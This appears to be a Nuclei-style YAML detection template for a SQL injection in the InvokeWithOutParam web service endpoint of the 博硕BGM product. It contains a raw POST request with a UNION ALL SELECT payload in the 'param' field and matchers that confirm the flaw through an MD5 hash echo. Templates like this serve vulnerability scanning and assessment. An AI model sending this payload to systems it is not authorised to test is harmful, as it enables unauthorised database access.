id: poc-yaml-bosure-bgm-invokewithoutparam-sqli
info:
  name: 博硕BGM InvokeWithOutParam SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in 博硕BGM InvokeWithOutParam endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/InvokeWithOutParam HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "assembly": "Crystal.PlatForm.Basic",
          "className": "Crystal.PlatForm.Basic.clsDictionary",
          "method": "GetDicCommonItem",
          "isCacheInvoke": true,
          "param": ["1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL,NULL,NULL-- VJMn"]
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "ReturnType"
          - "ReturnData"
          - "SubOrgId"
      - type: word
        part: body
        negative: true
        words:
          - "<"
